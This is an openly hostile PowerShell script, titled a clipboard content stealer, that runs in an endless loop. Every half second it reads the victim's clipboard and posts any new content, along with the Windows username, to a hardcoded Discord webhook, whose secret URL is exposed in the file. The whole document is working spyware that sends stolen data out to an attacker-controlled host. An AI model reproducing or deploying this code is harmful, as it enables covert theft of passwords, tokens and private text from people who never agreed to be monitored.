#Clipboard content stealer
#Sends new content of targets clipboard to discord webhook

#Yes I know this url shouldn't be publicly displayed
$webhookUrl  = 'https://discord.com/api/webhooks/1168730851631190066/poAU86kAE69lPvlRvhu6kWwsZZPWUwZcQ7uCfLcDD1OcCvdNrZ9kP_SLAmxwCOFragvF'
$PreviousClipboard = ""
while($true)
{
	start-sleep -seconds 0.5
	$currentClipboard = get-clipboard | Out-String
    	$currentClipboard = $currentClipboard.Trim()

	if ($currentClipboard -ne $PreviousClipboard) 
    	{
		$PreviousClipboard = $currentClipboard

		# Replace curly double quotes with regular double quotes
        	$currentClipboard = $currentClipboard -replace '“', '"'
        	$currentClipboard = $currentClipboard -replace '”', '"'
		
		
		#Discord webhook send code from I-Am-Jakoby
		$Body = @{
  			'username' = $env:username
  			'content' = "----------------------------`n`n" + $currentClipboard + "`n`n"
		}
		Invoke-RestMethod -ContentType 'Application/Json' -Uri $webhookUrl  -Method Post -Body ($Body | ConvertTo-Json)
	}	
}
EXIT
